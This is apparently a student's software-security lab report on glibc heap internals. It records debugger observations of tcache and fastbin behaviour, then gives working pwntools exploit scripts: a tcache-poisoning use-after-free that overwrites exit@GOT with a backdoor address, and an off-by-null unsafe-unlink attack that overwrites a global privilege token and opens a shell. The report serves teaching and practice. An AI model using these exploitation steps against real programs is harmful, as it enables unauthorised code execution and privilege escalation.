---
counter: True
comment: True
---

# 基础堆知识、漏洞与利用

!!! abstract
    软件安全 lab2 实验报告（2023.06.03 ~ 2023.06.19）

    !!! warning "仅供学习参考，请勿抄袭"

## 实验内容
- Challenge 1. test（40 分）
    - 在实验报告中提供截图和攻击代码证明完成如下目标
    - 针对要求的两个情形（开启 tcache 以及未开启 tcache），针对不同 checkpoint 进行截图调试以及描述（20 分）
    - 回答实验内容中提出的问题（20 分）
        - 开启 tcache 和不开启 tcache 初始堆状态有什么区别
        - 开启 tcache 和不开启 tcache 在 checkpoint-3 时 free 后存在的区别
        - checkpoint-4 时拿到的 chunk 是之前哪条语句释放的，有无 tcache 现象是否不一样?
        - checkpoint-7 时被释放的 a[0], a[1] 是怎样组织的，有无 tcache 现象是否不一样?
- Challenge 2. uaf（60 分）
    - 在实验报告中提供截图和攻击代码证明完成如下目标
    - 成功按步骤完成后门调用，步骤分（20+20+10+10分）
- Bonus: unsafe unlink（40 分）
    - 在实验报告中提供截图和攻击代码证明完成如下目标
    - 成功按步骤完成全局变量修改和 shell 弹出，步骤分（10+10+10+10分）

## Challenge: test

### 开启 tcache

checkpoint 0，初始状态，分配了两个 chunk（最顶上有一个初始 0x251 的 chunk）：

<div style="text-align: center; margin-top: 15px;">
<img src="/assets/images/sec/software/lab2/tcache/1.png" width="80%" style="margin: 0 auto;">
</div>

checkpoint 1 2 都是 malloc，没什么大问题，不放截图了。checkpoint 3，free 了四个 chunk，进入了 tcache：

<div style="text-align: center; margin-top: 15px;">
<img src="/assets/images/sec/software/lab2/tcache/3.png" width="80%" style="margin: 0 auto;">
</div>

<div style="page-break-before: always"></div>

<div style="text-align: center; margin-top: 15px;">
<img src="/assets/images/sec/software/lab2/tcache/4.png" width="80%" style="margin: 0 auto;">
</div>

checkpoint 4，重新分配了一个 0x10 大小的 chunk，可以发现这个 chunk 是从 tcachebins 取出来的：

<div style="text-align: center; margin-top: 15px;">
<img src="/assets/images/sec/software/lab2/tcache/5.png" width="80%" style="margin: 0 auto;">
</div>

checkpoint 5，free 了两个 chunk 进入 tcache。checkpoint 6，malloc 三个 0x500 的 chunk。checkpoint 7，free 了前两个，可以发现这两个进入了 unsorted bin，并且被合并了：

<div style="text-align: center; margin-top: 15px;">
<img src="/assets/images/sec/software/lab2/tcache/8.png" width="80%" style="margin: 0 auto;">
</div>

### 未开启 tcache
checkpoint 0，初始状态（除了 top chunk 以外只有分配的两个 chunk）：

<div style="text-align: center; margin-top: 15px;">
<img src="/assets/images/sec/software/lab2/notcache/1.png" width="80%" style="margin: 0 auto;">
</div>

checkpoint 3，free 了四个 chunk，进入了 fast bin：

<div style="text-align: center; margin-top: 15px;">
<img src="/assets/images/sec/software/lab2/notcache/2.png" width="80%" style="margin: 0 auto;">
</div>

checkpoint 4 从 fast bin 中取一个 chunk，checkpoint 5 又 free 了两个 chunk 进入 fast bin：

<div style="text-align: center; margin-top: 15px;">
<img src="/assets/images/sec/software/lab2/notcache/4.png" width="80%" style="margin: 0 auto;">
</div>

之后有一句 free(protect)，这里变化较大，由于 protect 是最新一个 chunk，紧接着 top chunk，所以它被 free 了之后连同着附近 unused 的 chunk 一起合并到了 top chunk 中，最外面的几个 fastbin 堆块也合并到了一起：

<div style="text-align: center; margin-top: 15px;">
<img src="/assets/images/sec/software/lab2/notcache/5.png" width="80%" style="margin: 0 auto;">
</div>

接着到达 checkpoint 6，malloc 三个 chunk。checkpoint 7，同样释放到 unsorted bin，然后被合并：

<div style="text-align: center; margin-top: 15px;">
<img src="/assets/images/sec/software/lab2/notcache/7.png" width="80%" style="margin: 0 auto;">
</div>

### 问题回答
- 开启 tcache 和不开启 tcache 初始堆状态有什么区别
    - 开启 tcache 时，初始堆最外侧会有一个 0x251 大小的 chunk
    - 不开启 tcache 时，初始堆只有 top chunk
- 开启 tcache 和不开启 tcache 在 checkpoint-3 时 free 后存在的区别
    - 开启 tcache 时，free 的 chunk 会进入 tcache
    - 不开启 tcache 时，free 的 chunk 会进入 fast bin
- checkpoint-4 时拿到的 chunk 是之前哪条语句释放的，有无 tcache 现象是否不一样?
    - 都是之前 free(b[1]) 释放的
    - 有无 tcache 现象一样，只是一个从 tcache 取这个 chunk，一个从 fast bin 取这个 chunk
- checkpoint-7 时被释放的 a[0], a[1] 是怎样组织的，有无 tcache 现象是否不一样?
    - 都是被释放到 unsorted bin，然后被合并到一起
    - 有无 tcache 现象完全一样

## Challenge: uaf
目的是实现任意地址写，从而劫持 exit 的 GOT 表，使之跳转到 backdoor 位置。

分析程序，add 负责调用 malloc 并将地址记录在 array 中，edit 负责修改堆块中内容，finish 负责调用 free，而 free 的时候不会将 array 中记录的地址置 NULL，所以存在 UAF 漏洞。

因此可以分配三个 chunk (top->C->B->A)，然后释放前两个，使之进入 tcache bin (tcache->B->A)，接下来利用 UAF 修改 B 中的 fd，使之指向 exit 的 GOT。然后 malloc 会取回 B，并让 tcache 指向 B 的 fd，即我们要写入的地址。这样接下来再 malloc 就会将堆分配到我们要的地址上，将 backdoor 地址写入堆内容即可。

交互用函数：

```python
def add(time, content):
    p.sendlineafter(b"chocie:\n", b"1")
    p.sendlineafter(b"time\n", time)
    p.sendlineafter(b"content\n", content)

def edit(idx, time, content):
    p.sendlineafter(b"chocie:\n", b"3")
    p.sendlineafter(b"index\n", str(idx).encode())
    p.sendlineafter(b"time\n", time)
    p.sendlineafter(b"content\n", content)

def free(idx):
    p.sendlineafter(b"chocie:\n", b"4")
    p.sendlineafter(b"index\n", str(idx).encode())
```

- 布局堆：
    ```python
    add(b"111", b"AAA")
    add(b"222", b"BBB")
    add(b"333", b"CCC")

    free(1)
    free(2) # tcache -> BBB -> AAA
    ```
- UAF 修改 BBB 的 fd：
    ```python
    edit(2, p64(elf.got["exit"]), b"DDD")
    ```
- 分配出 BBB，使 tcache 指向 BBB 的 fd：
    ```python
    add(b"444", b"EEE") # tcache -> exit@GOT
    ```
- 分配到任意地址，写入 backdoor 地址：
    ```python
    add(p64(elf.symbols["backdoor"]), b"FFF")
    ```
- 退出程序，进入 backdoor：
    ```python
    p.sendlineafter(b"chocie:\n", b"5")
    p.interactive()
    ```

远程攻击截图：

![](/assets/images/sec/software/lab2/uaf.png)

## Bonus: unsafe unlink
需要利用 off-by-null 漏洞篡改 chunk metadata，使得在 unlink 的时候修改任意地址。

具体一点就是分配三个堆（top->C->B->A），因为 A 在低地址，所以可以正常覆盖到 B 的 prev_size 部分，因为存在 off-by-null 漏洞，所以 B 中 size 的末字节可以被覆盖为 0，导致 glibc 认为此时 A 并未在使用。所以 free B 的时候会合并 chunk，此时触发 unlink A。unlink 代码：

```c 
#define unlink(AV, P, BK, FD) {                                           \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))  \
      malloc_printerr ("corrupted size vs. prev_size");                   \
    FD = P->fd;                                                           \
    BK = P->bk;                                                           \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                 \
      malloc_printerr ("corrupted double-linked list");                   \
    else {                                                                \
        FD->bk = BK;                                                      \
        BK->fd = FD;                                                      \
        /* ... */                                                         \
      }                                                                   \
}
```

利用其中的 FD->bk = BK、BK->fd = FD，此时 P 即为 A 偏移 0x10 的 fake chunk，其 fd bk 我们都可控。而 ->bk 和 ->fd 相当于向后偏移 0x10 和 0x18 字节，所以理论上就可以实现任意地址写。

根据实验指导以及上面的代码，可以发现有两个 glibc 的检测需要绕过：

- chunksize(P) != prev_size (next_chunk(P))
    - 只需要同时布局好 fake chunk 的 chunksize 即可
- FD->bk != P || BK->fd != P
    - 需要使得 FD->bk == BK->fd == P，即能够指回来
    - 可以利用 array[0]，它指向的位置就是 chunk 0 的内容，即 fake chunk 开头
    - 具体见下图

![](/assets/images/sec/software/lab2/unlink_heap.png)

根据左图的红色部分填写 chunk 0 内容即可伪造 fake chunk。其 fd 和 bk 的设置也在图中，根据蓝色箭头，可以发现 P->bk->fd P->fd->bk 都可以指回 P，以绕过检测。

然后在 unlink 时，FD->bk = BK 会被覆盖，有用的是 BK->fd = FD 一句，效果见上右图。unlink 之后 array[0] 的位置写入了 FD。于是修改 array[0] 指向的内容即修改栈上 FD 开始的内容，可以再次覆盖到 array[0]，使之指向 privilegeToken 位置。之后再次修改 array[0] 内容即可修改 privilegeToken。

交互用函数：

```python
def add(time, content):
    p.sendlineafter(b"chocie:\n", b"1")
    p.sendlineafter(b"time\n", time)
    p.sendlineafter(b"content\n", content)

def edit(idx, time, content):
    p.sendlineafter(b"chocie:\n", b"3")
    p.sendlineafter(b"index\n", str(idx).encode())
    p.sendlineafter(b"time\n", time)
    p.sendlineafter(b"content\n", content)

def free(idx):
    p.sendlineafter(b"chocie:\n", b"4")
    p.sendlineafter(b"index\n", str(idx).encode())
```

- 分配三个 chunk (top->C->B->A)：
    ```python
    add(b"111", b"AAA")
    add(b"222", b"BBB")
    add(b"333", b"CCC")
    ```
- 修改最顶层的堆 A，off-by-null 溢出到 B 的 PREV_INUSE，构造一个已经 free 的 fake chunk：
    ```python
    edit(
        1,
        p64(0) + p64(0x6f0) +
        p64(elf.symbols["array"] - 24) + p64(elf.symbols["array"] - 16)[:-1],
        b"\x00" * 0x6d0 + p64(0x6f0)
    )
    ```
    - 注意所有读取都存在 off-by-null 漏洞，所以刚好卡到大小的要截断一个字节
- free B，触发 unlink A：
    ```python
    free(2)
    ```
- 在栈上两次修改 array[0]，写入 privilegeToken：
    ```python
    edit(1, p64(0) * 3 + p64(elf.symbols["privilegeToken"])[:-1], b"\x00")
    edit(1, p64(<数据删除>), "\x00")
    ```

远程攻击截图：

![](/assets/images/sec/software/lab2/bonus.png)
